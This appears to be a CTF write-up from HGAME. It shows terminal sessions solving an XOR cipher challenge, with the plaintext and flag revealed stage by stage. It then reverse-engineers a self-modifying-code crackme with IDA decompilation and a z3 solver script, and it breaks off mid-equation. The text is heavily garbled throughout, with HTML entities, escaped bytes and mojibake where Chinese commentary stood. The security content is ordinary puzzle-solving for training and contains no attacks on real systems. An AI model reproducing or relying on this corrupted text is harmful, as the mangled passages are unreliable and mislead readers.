t:at3we\\x07re hard-w;rew tO look forr\\nig. our ancien\u0026amp; a}ceStors may \u0026lt;ot3haVe had \\na \u0026lt;amv fOr it, butrthvy Knew that \u0026amp;hezr *own bodie! wvre\\x00basicallyrsy~meTrical, asr\\nwvre\\x00those of \u0026#34;otvntIal predat=rs3or\\x00prey. \\nTh7reuorE, this ca?e zn Handy whet:er3\\ncHoosing a ?atv, Catching d;nnvr Or \\navoidi\u0026lt;g qeiNg on the ?enf oF a snarli\u0026lt;g,3\\nhUngry packrof3woLves or be3rs2\\nTAke a lookrat3yoUr face inrthv mIrror \\nandrimrgiNe a line !trrigHt down th7 \\n~idDle. You\\\u0026#39;l\u0026gt; sve Both sidesrof3yoUr \\nface a e creTty symmet icrl.\\x00This is \\n9nodn As bilater3l `ymMetry and ;t\\\u0026#39;` \\nWhere bothrsiwes\\x00either si6e |f This \\ndivi6int lIne appearrmoae Or less th7 srme\\x0e\\nSo here ;s ghe\\x00flag: \\nhg3mehX0R_i5-a_uS34U184nD$fUNny_C1\u0026#34;H3a}\\n\u0026#39; ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3 Python 3.8.5 (default, Jul 28 2020, 12:59:40) [GCC 9.3.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; ord(\u0026#39;;\u0026#39;) ^ ord(\u0026#39;a\u0026#39;) ^ ord(\u0026#39;i\u0026#39;) 51 \u0026gt;\u0026gt;\u0026gt; chr(51) \u0026#39;3\u0026#39; \u0026gt;\u0026gt;\u0026gt; ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3 solve.py 1069 b\u0026#34;\\nSymmetry zn Art is when t{e Elements of \\nr pAinting or drrwiNg balance eaph Other \\nout. T{is\\x00could be the3obJects themselees\\x0c \\nbut it can3alSo relate to polOrs and \\nothea cOmpositional gecHniques.\\nYou ~ay\\x00not realize zt,\\x00but your brazn *is busy workzng\\x00behind the spenEs to seek \\noft Symmetry when3yoU look at a prinTing. \\nThere rre\\x00several reas|ns\\x00for this. Thv \\nFirst is that3we\\x07re hard-wirew tO look for \\nig. our ancient a}ceStors may not3haVe had \\na namv fOr it, but thvy Knew that thezr *own bodies wvre\\x00basically sy~meTrical, as \\nwvre\\x00those of potvntIal predators3or\\x00prey. \\nThereuorE, this came zn Handy whether3\\ncHoosing a matv, Catching dinnvr Or \\navoiding qeiNg on the menf oF a snarling,3\\nhUngry pack of3woLves or bears2\\nTAke a look at3yoUr face in thv mIrror \\nand imrgiNe a line strrigHt down the \\n~idDle. You\u0026#39;ll sve Both sides of3yoUr \\nface are creTty symmetricrl.\\x00This is \\nknodn As bilateral `ymMetry and it\u0026#39;` \\nWhere both siwes\\x00either side |f This \\ndividint lIne appear moae Or less the srme\\x0e\\nSo here is ghe\\x00flag: \\nhgamehX0R_i5-a_uS3fU184nD$fUNny_C1pH3a}\\n\u0026#34; ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3 Python 3.8.5 (default, Jul 28 2020, 12:59:40) [GCC 9.3.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; ord(\u0026#39;x\u0026#39;) ^ ord(\u0026#39; \u0026#39;) 88 \u0026gt;\u0026gt;\u0026gt; chr(88) \u0026#39;X\u0026#39; \u0026gt;\u0026gt;\u0026gt; ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3 solve.py 1069 b\u0026#34;\\nSymmetry zn art is when t{e elements of \\nr painting or drrwing balance eaph other \\nout. T{is could be the3objects themselees, \\nbut it can3also relate to polors and \\nothea compositional gechniques.\\nYou ~ay not realize zt, but your brazn \\nis busy workzng behind the spenes to seek \\noft symmetry when3you look at a printing. \\nThere rre several reas|ns for this. Thv \\nfirst is that3we\u0026#39;re hard-wirew to look for \\nig. Our ancient a}cestors may not3have had \\na namv for it, but thvy knew that thezr \\nown bodies wvre basically sy~metrical, as \\nwvre those of potvntial predators3or prey. \\nThereuore, this came zn handy whether3\\nchoosing a matv, catching dinnvr or \\navoiding qeing on the menf of a snarling,3\\nhungry pack of3wolves or bears2\\nTake a look at3your face in thv mirror \\nand imrgine a line strright down the \\n~iddle. You\u0026#39;ll sve both sides of3your \\nface are cretty symmetricrl. This is \\nknodn as bilateral `ymmetry and it\u0026#39;` \\nwhere both siwes either side |f this \\ndividint line appear moae or less the srme.\\nSo here is ghe flag: \\nhgamehX0r_i5-a_uS3fU184nd$fUNny_C1pH3a}\\n\u0026#34; ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3 Python 3.8.5 (default, Jul 28 2020, 12:59:40) [GCC 9.3.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; ord(\u0026#39;g\u0026#39;) ^ ord(\u0026#39;C\u0026#39;) ^ ord(\u0026#39;t\u0026#39;) 80 \u0026gt;\u0026gt;\u0026gt; chr(80) \u0026#39;P\u0026#39; \u0026gt;\u0026gt;\u0026gt; ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3 solve.py 1069 b\u0026#34;\\nSymmetry in art is when the elements of \\na painting or drawing balance each other \\nout. This could be the objects themselves, \\nbut it can also relate to colors and \\nother compositional techniques.\\nYou may not realize it, but your brain \\nis busy working behind the scenes to seek \\nout symmetry when you look at a painting. \\nThere are several reasons for this. The \\nfirst is that we\u0026#39;re hard-wired to look for \\nit. Our ancient ancestors may not have had \\na name for it, but they knew that their \\nown bodies were basically symmetrical, as \\nwere those of potential predators or prey. \\nTherefore, this came in handy whether \\nchoosing a mate, catching dinner or \\navoiding being on the menu of a snarling, \\nhungry pack of wolves or bears!\\nTake a look at your face in the mirror \\nand imagine a line straight down the \\nmiddle. You\u0026#39;ll see both sides of your \\nface are pretty symmetrical. This is \\nknown as bilateral symmetry and it\u0026#39;s \\nwhere both sides either side of this \\ndividing line appear more or less the same.\\nSo here is the flag: \\nhgame{X0r_i5-a_uS3fU1+4nd$fUNny_C1pH3r}\\n\u0026#34; FAKE ç¬¬ä¸€æ¬¡åš SMC\nstep 0ï¼šé”™è¯¯çš„åšæ³• æ‹–å…¥ida\nè¿›å…¥ä¸»å‡½æ•°\n__int64 __usercall main@\u0026lt;rax\u0026gt;(char **a1@\u0026lt;rsi\u0026gt;, char **a2@\u0026lt;rdx\u0026gt;, __int64 a3@\u0026lt;rbp\u0026gt;) { __int64 v3; // rdx __int64 v4; // rdx __int64 v6; // [rsp-D8h] [rbp-D8h] __int64 flag; // [rsp-48h] [rbp-48h] signed int i; // [rsp-Ch] [rbp-Ch] __int64 v9; // [rsp-8h] [rbp-8h] __asm { endbr64 } v9 = a3; print(\u0026#34;Give me your true flag:\u0026#34;, a1, a2); scan(\u0026#34;%50s\u0026#34;, \u0026amp;flag); if ( length(\u0026amp;flag) != 36 ) { print(\u0026#34;Wrong length.\u0026#34;, \u0026amp;flag, v3); sub_401120(); } for ( i = 0; i \u0026lt;= 35; ++i ) *((_DWORD *)\u0026amp;v9 + i - 52) = *((char *)\u0026amp;v9 + i - 64);// v9 - 64 = flag, flagå¾€å‰åç§»12ä¸ªå­—èŠ‚ if ( (unsigned int)sub_401216((__int64)\u0026amp;v6) == 1 )// åŠ¨æ€è°ƒè¯•ç»“æœæ˜¾ç¤ºï¼Œv6å°±æ˜¯è¾“å…¥çš„flag print(\u0026#34;Ohhhhhhhhhh!\u0026#34;, \u0026amp;flag, v4); else print(\u0026#34;Wrong flag. Keep looking!\u0026#34;, \u0026amp;flag, v4); return 0LL; } å‘ç°å¯¹äºè¾“å…¥çš„flagï¼Œè¿›è¡Œä¸€ä¸ªå‡½æ•°çš„åˆ¤æ–­\nè¿›å…¥å‡½æ•°ï¼Œå‘ç°ä¸€ä¸²å¦‚ä¸‹çš„ä»£ç \nv2 = -37 * *(_DWORD *)(*(v1 - 3) + 4) + -58 * *(_DWORD *)(*(v1 - 3) + 132) + 17 * *(_DWORD *)(*(v1 - 3) + 28) + 26 * *(_DWORD *)(*(v1 - 3) + 124) + -20 * *(_DWORD *)(*(v1 - 3) + 48) + -56 * *(_DWORD *)(*(v1 - 3) + 104) + 70 * *(_DWORD *)(*(v1 - 3) + 76) + 29 * *(_DWORD *)*(v1 - 3) + -42 * *(_DWORD *)(*(v1 - 3) + 68) + 67 * *(_DWORD *)(*(v1 - 3) + 140) + 11 * *(_DWORD *)(*(v1 - 3) + 24) + 66 * *(_DWORD *)(*(v1 - 3) + 60) + 53 * *(_DWORD *)(*(v1 - 3) + 44) - 53 * *(_DWORD *)(*(v1 - 3) + 12) + 63 * *(_DWORD *)(*(v1 - 3) + 128) - 65 * *(_DWORD *)(*(v1 - 3) + 84) + 9 * *(_DWORD *)(*(v1 - 3) + 36) - 50 * *(_DWORD *)(*(v1 - 3) + 112) - 48 * *(_DWORD *)(*(v1 - 3) + 32) - 70 * *(_DWORD *)(*(v1 - 3) + 88) + 48 * *(_DWORD *)(*(v1 - 3) + 52); if ( -35 * *(_DWORD *)(*(v1 - 3) + 8) + 89 * *(_DWORD *)(*(v1 - 3) + 96) + -49 * *(_DWORD *)(*(v1 - 3) + 64) + -19 * *(_DWORD *)(*(v1 - 3) + 16) + 88 * *(_DWORD *)(*(v1 - 3) + 100) + -7 * *(_DWORD *)(*(v1 - 3) + 120) + *(_DWORD *)(*(v1 - 3) + 108) + -33 * *(_DWORD *)(*(v1 - 3) + 80) + -23 * *(_DWORD *)(*(v1 - 3) + 92) + 90 * *(_DWORD *)(*(v1 - 3) + 56) + -99 * *(_DWORD *)(*(v1 - 3) + 40) + 30 * *(_DWORD *)(*(v1 - 3) + 116) + v2 - 68 * *(_DWORD *)(*(v1 - 3) + 136) - 14 * *(_DWORD *)(*(v1 - 3) + 20) - 67 * *(_DWORD *)(*(v1 - 3) + 72) != -874 ) goto LABEL_42; ç”¨gdbè°ƒè¯•çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç° *(v1 - 3) + 4 * i å°±å¯¹åº” input[i]\næ€»å…±æœ‰36ä¸ªæ–¹ç¨‹ï¼Œä½¿ç”¨z3æ±‚è§£\nfrom z3 import * s = Solver() f = [ Int(\u0026#39;f%d\u0026#39; % i) for i in range(36) ] for i in range(36): s.add(f[i] \u0026gt; 0x20) s.add(f[i] \u0026lt; 0x7f) s.add(f[ 0] == ord(\u0026#39;h\u0026#39;)) s.add(f[ 1] == ord(\u0026#39;g\u0026#39;)) s.add(f[ 2] == ord(\u0026#39;a\u0026#39;)) s.add(f[ 3] == ord(\u0026#39;m\u0026#39;)) s.add(f[ 4] == ord(\u0026#39;e\u0026#39;)) s.add(f[ 5] == ord(\u0026#39;{\u0026#39;)) s.add(f[35] == ord(\u0026#39;}\u0026#39;)) s.add(-37 * f[1] + -58 * f[33] + 17 * f[7] + 26 * f[31] + -20 * f[12] + -56 * f[26] + 70 * f[19] + 29 * f[0] + -42 * f[17] + 67 * f[35] + 11 * f[6] + 66 * f[15] + 53 * f[11] - 53 * f[3] + 63 * f[32] - 65 * f[21] + 9 * f[9] - 50 * f[28] - 48 * f[8] - 70 * f[22] + 48 * f[13] -35 * f[2] + 89 * f[24] + -49 * f[16] + -19 * f[4] + 88 * f[25] + -7 * f[30] + f[27] + -33 * f[20] + -23 * f[23] + 90 * f[14] + -99 * f[10] + 30 * f[29] - 68 * f[34] - 14 * f[5] - 67 * f[18] == -874) s.add(64 * f[18] + -57 * f[15] + 90 * f[21] + 57 * f[4] + -63 * f[13] + 13 * f[2] + 10 * f[35] + -56 * f[8] + 56 * f[31] + -40 * f[0] + -91 * f[27] + 57 * f[23] + 62 * f[10] + 90 * f[9] + -92 * f[17] + -5 * f[29] + 60 * f[22] - 13 * f[12] + 5 * f[28] - 63 * f[32] + 5 * f[26] -41 * f[25] + -47 * f[16] + f[14] + 67 * f[34] + -20 * f[1] + 47 * f[33] + -79 * f[19] + -17 * f[6] + 30 * f[5] + 70 * f[3] + 41 * f[7] + 71 * f[24] + 15 * f[11] + 42 * f[20] == 21163) s.add(28 * f[13] + 77 * f[19] + 2 * f[7] + -53 * f[10] + -61 * f[4] + 12 * f[17] + 93 * f[11] + -13 * f[32] + 53 * f[9] + 29 * f[16] + -77 * f[14] + 77 * f[33] + 74 * f[34] + -100 * f[30] - 99 * f[27] - 87 * f[25] + 36 * f[6] + 59 * f[3] + 81 * f[21] + 28 * f[28] + 7 * f[0] + 73 * f[26] + 50 * f[20] + 88 * f[35] + 49 * f[1] + 34 * f[23] + 58 * f[29] + 69 * f[24] + 54 * f[22] - 5 * f[31] - 41 * f[2] + 5 * f[18] - 93 * f[15] + 10 * f[12] - 27 * f[8] + 24 * f[5] == 45615) s.add(-46 * f[20] + -61 * f[6] + -46 * f[19] + 51 * f[4] + -76 * f[34] + -17 * f[31] + 8 * f[28] + 94 * f[30] + 23 * f[8] + -61 * f[29] + -52 * f[35] + 81 * f[33] + -44 * f[1] + 75 * f[32] + -9 * f[24] - 96 * f[12] + 5 * f[26] + 2 * f[25] + 31 * f[22] + 43 * f[15] - 2 * f[0] - 17 * f[23] + 53 * f[21] + 51 * f[13] + 58 * f[17] + -52 * f[10] + -77 * f[7] + 86 * f[11] + -77 * f[16] + -100 * f[18] + -61 * f[2] - 92 * f[14] + 13 * f[5] - 99 * f[3] + 63 * f[27] + 8 * f[9] == -37017) s.add(9 * f[16] + 59 * f[3] + -29 * f[14] + 32 * f[18] + -69 * f[26] + -81 * f[33] + -69 * f[9] + 60 * f[19] + -35 * f[21] + 40 * f[11] + -44 * f[7] + 78 * f[22] + 68 * f[28] + 70 * f[29] + 3 * f[2] + 61 * f[6] + 37 * f[35] - 36 * f[27] + 40 * f[34] + 23 * f[17] + 81 * f[12] - 25 * f[4] + 91 * f[0] + -43 * f[32] + 17 * f[13] + 9 * f[15] + f[1] * 64 + 69 * f[30] - 9 * f[23] - 75 * f[25] - 62 * f[20] + 56 * f[31] + 96 * f[5] + 69 * f[8] + 80 * f[10] + 99 * f[24] == 72092) s.add(-79 * f[26] + -20 * f[8] + 90 * f[6] + 6 * f[30] + 47 * f[16] + 50 * f[20] + 51 * f[23] + -13 * f[33] + -86 * f[13] + 32 * f[31] + -89 * f[2] + 79 * f[11] + -41 * f[7] + -56 * f[14] + 54 * f[19] - 96 * f[34] - 34 * f[25] - 64 * f[4] - 36 * f[35] + 48 * f[10] - 39 * f[5] + 51 * f[32] + -63 * f[21] + 78 * f[24] + -76 * f[28] + 48 * f[18] + 93 * f[1] + 66 * f[29] + -86 * f[27] + -3 * f[0] + 20 * f[3] + 61 * f[17] - 56 * f[15] - 97 * f[22] + 96 * f[9] - 61 * f[12] == -27809) s.add(-74 * f[28] + 76 * f[33] + 91 * f[5] + 83 * f[19] + 99 * f[32] + 98 * f[7] + 22 * f[34] + 83 * f[13] + -13 * f[0] + -66 * f[11] + -25 * f[2] + -9 * f[31] + 35 * f[25] + 31 * f[18] - 95 * f[21] + 37 * f[22] - 74 * f[16] + 17 * f[12] - 27 * f[24] + 11 * f[3] + 83 * f[9] + -44 * f[35] + -26 * f[30] + -36 * f[4] + 64 * f[6] + -65 * f[26] + -46 * f[8] + -33 * f[14] + -45 * f[1] + -32 * f[23] - 60 * f[27] + 77 * f[20] + 96 * f[15] - 23 * f[10] - 5 * f[29] - 73 * f[17] == 9604) s.add(-57 * f[31] + 32 * f[25] + 55 * f[16] + 42 * f[24] + -93 * f[26] + 69 * f[17] + 84 * f[12] + 9 * f[23] + -34 * f[32] + -84 * f[2] + -18 * f[7] + 60 * f[29] - 99 * f[30] - f[0] + 24 * f[21] - 36 * f[4] + 9 * f[35] + 89 * f[15] + 72 * f[19] + 86 * f[13] - 8 * f[28] + -79 * f[10] + 82 * f[8] + -88 * f[3] + -26 * f[11] + 76 * f[1] + 69 * f[27] + -51 * f[14] + 78 * f[33] + -11 * f[18] + -83 * f[5] + 70 * f[20] + -36 * f[22] + 64 * f[6] + 19 * f[9] + 71 * f[34] == 25498) s.add(-80 * f[15] + -54 * f[2] + 75 * f[6] + -31 * f[17] + 29 * f[12] + 28 * f[28] + 57 * f[14] + -68 * f[4] + 86 * f[0] + 82 * f[13] + -20 * f[11] + -18 * f[23] + 88 * f[18] + -57 * f[25] + 94 * f[9] - 51 * f[5] - 58 * f[7] - 2 * f[3] + 94 * f[31] - 6 * f[21] - 59 * f[19] + -70 * f[8] + 50 * f[30] + 26 * f[16] + 65 * f[32] + -62 * f[34] + 79 * f[10] + -82 * f[27] + -16 * f[29] + -60 * f[1] + 25 * f[20] - 66 * f[35] - 62 * f[24] + 89 * f[26] + 12 * f[22] - 86 * f[33] == -10472) s.add(-91 * f[20] + -11 * f[17] + 38 * f[3] + 53 * f[35] + 31 * f[5] + -75 * f[22] + 14 * f[26] + -7 * f[24] + -7 * f[31] + 77 * f[23] + -46 * f[6] + 47 * f[19] + 48 * f[33] + 74 * f[ 1] - 24 * f[30] + 87 * f[9] + 33 * f[11] + 86 * f[28] + 37 * f[21] - 97 * f[27] - 30 * f[13] + 31 * f[14] + -11 * f[2] + 30 * f[10] + 72 * f[8] + 72 * f[29] + -49 * f[34] + 83 * f[18] + -63 * f[0] + -88 * f[4] - 59 * f[16] + 5 * f[7] - 3 * f[15] + 13 * f[12] - 73 * f[32] - 56 * f[25] == 6560) s.add(-74 * f[20] + -97 * f[6] + 14 * f[15] + 77 * f[30] + -66 * f[28] + -89 * f[12] + -95 * f[13] + -70 * f[10] + -27 * f[1] + -85 * f[22] + -66 * f[34] + -91 * f[4] - 5 * f[19] - 94 * f[29] - 24 * f[35] - 7 * f[32] + 63 * f[5] - 49 * f[14] - 96 * f[18] - 100 * f[7] + 81 * f[16] + 59 * f[23] + -81 * f[8] + 49 * f[0] + -52 * f[3] + 84 * f[2] + 26 * f[25] + 70 * f[11] + 3 * f[21] + 28 * f[24] - 14 * f[9] + 59 * f[17] + 24 * f[31] - 25 * f[27] + 20 * f[33] - 77 * f[26] == -69431) s.add(-69 * f[25] + 33 * f[20] + 55 * f[24] + 69 * f[18] + 83 * f[15] + -19 * f[13] + 22 * f[21] + f[16] + -53 * f[22] + -58 * f[4] + -63 * f[29] - 91 * f[26] + 28 * f[34] + 5 * f[3] + 35 * f[8] + 27 * f[ 1] - 31 * f[27] + 10 * f[12] + 84 * f[33] + 24 * f[14] + 42 * f[11] + 98 * f[28] + 2 * f[7] + 70 * f[19] + 53 * f[35] + 34 * f[6] + 30 * f[5] + 55 * f[23] + 69 * f[10] + 60 * f[2] - 2 * f[17] + 68 * f[32] + 21 * f[0] - f[9] + 60 * f[31] - 60 * f[30] == 54106) s.add(15 * f[31] + -96 * f[21] + 38 * f[19] + -81 * f[9] + -68 * f[12] + 89 * f[20] + 33 * f[2] + 70 * f[34] + 79 * f[28] + -80 * f[35] + 76 * f[10] - 38 * f[5] + 5 * f[6] + 60 * f[11] - 8 * f[26] - 59 * f[23] + 9 * f[24] + 34 * f[17] - 60 * f[1] + 98 * f[25] + 48 * f[16] + -88 * f[22] + -96 * f[3] + f[18] * 64 + -61 * f[15] + -92 * f[13] + 50 * f[8] + 90 * f[29] + 32 * f[4] + -97 * f[27] + 14 * f[14] + f[30] + 97 * f[7] - 17 * f[32] - 96 * f[0] + 54 * f[33] == -8292) s.add(-7 * f[3] + 49 * f[17] + 60 * f[25] + -45 * f[16] + -50 * f[0] + -98 * f[28] + -92 * f[12] + -22 * f[23] + 33 * f[13] + 57 * f[31] - 15 * f[5] + 36 * f[29] - 88 * f[15] + 12 * f[21] + 71 * f[14] - 48 * f[35] + 79 * f[34] - 5 * f[19] + 68 * f[33] - 2 * f[4] - 82 * f[10] + -58 * f[32] + 53 * f[8] + -57 * f[30] + -29 * f[24] + -28 * f[26] - 16 * f[18] - 98 * f[22] - f[27] * 64 + 32 * f[11] + 73 * f[2] - 38 * f[20] + 27 * f[9] - 7 * f[7] - 30 * f[ 1] - 35 * f[6] == -44677) s.add(4 * f[31] + -43 * f[18] + -36 * f[29] + 60 * f[14] + 29 * f[20] + -85 * f[19] + 71 * f[27] + -22 * f[11] + 95 * f[9] + 19 * f[12] + -20 * f[30] + 6 * f[34] + 49 * f[6] + 13 * f[10] - 23 * f[13] + 17 * f[7] - 79 * f[22] + 12 * f[3] - 7 * f[4] - 12 * f[2] - 78 * f[17] + -86 * f[28] + -69 * f[33] + -31 * f[21] + 91 * f[15] + 91 * f[8] + 58 * f[16] + -91 * f[23] - 56 * f[5] + 59 * f[26] + 18 * f[32] - 87 * f[35] - 30 * f[24] + 54 * f[25] - 5 * f[ 1] - 94 * f[0] == -17772) s.add(-17 * f[9] + -93 * f[12] + -85 * f[20] + -73 * f[35] + -87 * f[24] + -80 * f[25] + -87 * f[4] + 56 * f[27] + -89 * f[21] + 52 * f[15] + 97 * f[0] + -11 * f[19] + -94 * f[10] + -92 * f[29] + -20 * f[17] - 95 * f[5] - 13 * f[8] + 80 * f[31] - f[33] + 37 * f[30] + 64 * f[32] + -18 * f[18] + -76 * f[34] + 65 * f[3] + -78 * f[13] + -71 * f[26] + -44 * f[23] + 61 * f[7] + 63 * f[1] + 9 * f[16] + 11 * f[22] - 39 * f[14] + 80 * f[6] - 33 * f[11] - 62 * f[2] - 74 * f[28] == -77151) s.add(54 * f[20] + 65 * f[22] + -9 * f[9] + -61 * f[24] + -45 * f[25] + 47 * f[4] + 31 * f[5] + 36 * f[23] + 20 * f[13] - 40 * f[2] - 64 * f[12] - 40 * f[14] + 81 * f[10] - 35 * f[0] - 12 * f[27] + 35 * f[30] + 63 * f[15] - 65 * f[19] + 31 * f[18] - 42 * f[35] + 33 * f[11] + 43 * f[33] + 76 * f[32] + -4 * f[26] + 59 * f[6] + -85 * f[34] + 69 * f[29] + 77 * f[31] + -95 * f[8] + 75 * f[16] - 19 * f[3] + 65 * f[21] - 78 * f[7] - 48 * f[28] - 77 * f[17] == 11531) s.add(-12 * f[0] + 55 * f[17] + 35 * f[20] + 76 * f[13] + -73 * f[15] + 84 * f[12] + -72 * f[3] + 71 * f[24] + -41 * f[7] + 28 * f[8] + -93 * f[34] + -63 * f[30] + 35 * f[6] - 38 * f[10] - 4 * f[16] + 99 * f[11] + 10 * f[4] - 98 * f[35] - 9 * f[18] + 22 * f[21] - 6 * f[26] + 67 * f[23] + 95 * f[5] + -37 * f[9] + -71 * f[25] + 33 * f[32] + 96 * f[14] + 47 * f[31] + -92 * f[27] + -51 * f[1] + -25 * f[28] + 82 * f[2] - 6 * f[33] - 13 * f[29] + 25 * f[22] - 35 * f[19] == 4538) s.add(79 * f[27] + 87 * f[24] + -52 * f[29] + -72 * f[13] + -17 * f[23] + 54 * f[0] + 45 * f[10] + -17 * f[33] + -49 * f[4] + -34 * f[17] + 87 * f[7] + -41 * f[18] + 2 * f[30] + -81 * f[11] + 37 * f[35] - 46 * f[9] + 25 * f[32] - 45 * f[14] - 30 * f[12] + 83 * f[19] + 24 * f[1] + 98 * f[16] + 64 * f[21] + 93 * f[8] + 78 * f[2] + 56 * f[15] + -51 * f[6] + -17 * f[26] + -50 * f[25] + -76 * f[3] + -65 * f[28] + -36 * f[31] + 88 * f[34] + 77 * f[20] - 62 * f[5] + 67 * f[22] == 33735) s.add(37 * f[17] + -21 * f[19] + 55 * f[21] + -70 * f[26] + 92 * f[6] + 75 * f[31] + -35 * f[29] + -50 * f[25] + 8 * f[33] + -74 * f[13] + 34 * f[35] + 29 * f[24] + -10 * f[15] + -75 * f[16] + 24 * f[18] + 98 * f[0] + 41 * f[20] - 54 * f[28] - 5 * f[23] - 66 * f[9] + 3 * f[5] + 30 * f[1] + -29 * f[7] + -71 * f[30] + 61 * f[10] + -25 * f[4] + 82 * f[32] + 62 * f[22] + -40 * f[34] + 90 * f[3] + -36 * f[14] - 66 * f[2] + 15 * f[12] - 74 * f[27] + 31 * f[8] - 68 * f[11] == -7107) s.add(-34 * f[13] + -13 * f[15] + -11 * f[19] + 28 * f[17] + 98 * f[9] + -69 * f[3] + 64 * f[25] + -66 * f[7] + -71 * f[6] + 75 * f[34] + 19 * f[32] + -94 * f[33] - 72 * f[18] + 35 * f[26] - 32 * f[27] + 76 * f[1] + 80 * f[28] + 66 * f[10] + 3 * f[12] - 99 * f[14] + 17 * f[30] + -79 * f[24] + -83 * f[29] + 55 * f[35] + -75 * f[8] + 77 * f[31] + 84 * f[22] - 94 * f[0] + 12 * f[2] + 61 * f[20] - 24 * f[23] + 62 * f[11] + 37 * f[16] - 65 * f[21] - 2 * f[4] - 90 * f[5] == -17028) s.add(24 * f[3] + -76 * f[2] + -94 * f[16] + -37 * f[4] + -31 * f[7] + -65 * f[0] + -23 * f[22] + 80 * f[24] + -48 * f[20] + -42 * f[32] + 47 * f[9] - 95 * f[6] - 10 * f[35] - 30 * f[34] - 67 * f[12] + 81 * f[14] - 21 * f[27] + 65 * f[18] + 60 * f[25] + 31 * f[17] - 20 * f[31] + -17 * f[21] + -34 * f[26] + 64 * f[15] + 43 * f[11] + 39 * f[23] + 68 * f[33] + -58 * f[13] + 21 * f[1] + 19 * f[19] + 96 * f[8] - 32 * f[30] - 83 * f[28] + 20 * f[5] - 3 * f[29] + 7 * f[10] == -21641) s.add(-76 * f[0] + -82 * f[22] + -92 * f[24] + 53 * f[20] + -90 * f[5] + 3 * f[34] + 93 * f[2] + 77 * f[25] + -40 * f[16] + -59 * f[26] + -91 * f[15] + 55 * f[9] + -84 * f[35] + -46 * f[12] + -41 * f[31] + -55 * f[8] + 97 * f[32] + 56 * f[19] - 15 * f[13] - 93 * f[4] + 37 * f[33] + -52 * f[7] + -82 * f[23] + 14 * f[27] + 52 * f[6] + 67 * f[11] + f[3] + -37 * f[30] - 88 * f[18] - 16 * f[10] + f[14] + 48 * f[17] - 80 * f[21] + 17 * f[29] - 94 * f[28] - 12 * f[ 1] == -71317) s.add(-71 * f[21] + -55 * f[5] + -76 * f[4] + -94 * f[10] + -79 * f[26] + 95 * f[28] + 58 * f[3] + -85 * f[13] + -74 * f[27] + -35 * f[16] + 68 * f[2] + 84 * f[11] + -25 * f[23] + -91 * f[33] + -87 * f[14] + -65 * f[34] + 23 * f[20] + -91 * f[15] + 34 * f[12] + 53 * f[ 1] - 16 * f[24] + 46 * f[9] + -26 * f[0] + 42 * f[30] + 22 * f[25] + -89 * f[19] + 34 * f[32] + -12 * f[29] + -16 * f[7] + 22 * f[18] + -52 * f[31] + 83 * f[22] + 5 * f[17] - 71 * f[6] + 41 * f[35] + 68 * f[8] == -41387) s.add(-97 * f[12] + -19 * f[19] + -87 * f[3] + 89 * f[27] + 54 * f[5] + 59 * f[22] + 95 * f[17] + 62 * f[26] + 6 * f[20] + 64 * f[14] + -50 * f[13] + -95 * f[30] + -68 * f[16] + 10 * f[0] - f[2] - f[28] + 17 * f[18] - 76 * f[6] - 24 * f[23] - 76 * f[11] + 33 * f[34] - 98 * f[31] + -59 * f[10] + 35 * f[4] + -53 * f[8] + -18 * f[1] + 9 * f[32] + -45 * f[9] - 60 * f[29] - 74 * f[35] + 31 * f[7] + 50 * f[24] + 25 * f[21] - 83 * f[33] + 25 * f[25] + 52 * f[15] == -30463) s.add(-27 * f[25] + 84 * f[34] + -73 * f[14] + -54 * f[7] + -45 * f[26] + -97 * f[18] + 40 * f[10] + 73 * f[27] + -55 * f[11] + 52 * f[29] + -29 * f[13] + 32 * f[24] + -80 * f[0] + -79 * f[17] + -39 * f[6] + 88 * f[1] + 44 * f[2] - 50 * f[3] - 2 * f[22] - 44 * f[31] - 62 * f[8] + -68 * f[5] + 77 * f[21] + -34 * f[15] + -42 * f[35] + 30 * f[28] + -54 * f[30] + -53 * f[20] + 98 * f[33] + 70 * f[32] + 99 * f[19] - 51 * f[4] + 12 * f[16] - 55 * f[9] + 40 * f[12] + 76 * f[23] == -14435) s.add(86 * f[20] + 70 * f[13] + -76 * f[19] + -31 * f[28] + 77 * f[14] + 48 * f[15] + -78 * f[31] + -82 * f[26] + 69 * f[3] + 70 * f[5] + 95 * f[6] - 60 * f[4] + 30 * f[27] + 3 * f[29] - 29 * f[32] + 5 * f[24] + 55 * f[0] + 36 * f[23] - 90 * f[22] + 37 * f[35] + 78 * f[34] + 20 * f[11] + -64 * f[1] + 74 * f[30] + 16 * f[16] + -83 * f[33] + 16 * f[2] + -17 * f[17] + -28 * f[8] + 9 * f[7] - 62 * f[10] + 46 * f[9] + 63 * f[21] - 39 * f[12] - 64 * f[18] - 27 * f[25] == 23472) s.add(7 * f[0] + 92 * f[6] + -57 * f[24] + -89 * f[11] + -47 * f[5] + -39 * f[30] + 64 * f[8] + -63 * f[12] + -46 * f[9] + -82 * f[17] + 39 * f[23] + 58 * f[13] - 81 * f[1] + 33 * f[29] + 89 * f[7] - 14 * f[20] + 97 * f[33] + 10 * f[35] - 46 * f[14] + 81 * f[4] + 89 * f[15] + 97 * f[21] + -71 * f[2] + -7 * f[19] + -55 * f[3] + 85 * f[16] + -97 * f[34] + -29 * f[27] + -79 * f[32] + 50 * f[28] + 81 * f[22] - 44 * f[31] - 60 * f[10] - 20 * f[26] + 18 * f[18] + 91 * f[25] == 7913) s.add(49 * f[17] + 52 * f[18] + -89 * f[25] + -93 * f[35] + -70 * f[11] + -45 * f[24] + 88 * f[30] + 92 * f[31] + 44 * f[26] + -5 * f[1] + -48 * f[6] + -16 * f[22] + 88 * f[32] + 91 * f[33] + 82 * f[28] + 98 * f[8] - 63 * f[13] - 8 * f[9] - f[16] - 4 * f[27] - 47 * f[4] + -41 * f[10] + 67 * f[29] + -22 * f[15] + -79 * f[12] + 